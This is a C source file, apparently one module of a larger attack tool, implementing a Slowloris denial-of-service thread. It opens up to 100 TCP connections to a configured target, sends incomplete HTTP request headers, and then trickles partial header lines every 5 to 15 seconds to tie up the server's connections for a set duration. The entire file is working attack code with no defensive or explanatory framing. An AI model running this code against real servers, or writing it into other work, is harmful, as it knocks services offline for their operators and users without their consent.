#include "../../include/elcienco.h"

extern volatile int attack_running;

void *slowloris_attack(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    printf("[Slowloris Thread %d] Started against %s:%d\n",
           data->thread_num, cfg.target, cfg.port);
    
    #define MAX_SLOW_SOCKETS 100
    int sockets[MAX_SLOW_SOCKETS];
    int socket_count = 0;
    
    time_t start_time = time(NULL);
    
    // Open multiple connections
    for (int i = 0; i < MAX_SLOW_SOCKETS && socket_count < MAX_SLOW_SOCKETS; i++) {
        int sock = create_tcp_socket();
        if (sock < 0) continue;
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(cfg.port);
        server_addr.sin_addr.s_addr = inet_addr(cfg.target);
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            char request[512];
            snprintf(request, sizeof(request),
                "GET /%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n",
                rand(), cfg.target);
            
            send(sock, request, strlen(request), 0);
            sockets[socket_count++] = sock;
        } else {
            close(sock);
        }
    }
    
    printf("[Slowloris Thread %d] Opened %d connections\n", 
           data->thread_num, socket_count);
    
    // Keep connections alive by sending partial headers
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        for (int i = 0; i < socket_count; i++) {
            if (sockets[i] > 0) {
                char keepalive[] = "X-Keepalive: 1\r\n";
                if (send(sockets[i], keepalive, strlen(keepalive), MSG_NOSIGNAL) < 0) {
                    close(sockets[i]);
                    sockets[i] = -1;
                }
            }
        }
        
        sleep(rand() % 10 + 5); // Wait 5-15 seconds between keepalives
    }
    
    // Close all sockets
    for (int i = 0; i < socket_count; i++) {
        if (sockets[i] > 0) {
            close(sockets[i]);
        }
    }
    
    printf("[Slowloris Thread %d] Finished\n", data->thread_num);
    
    free(data);
    return NULL;
}
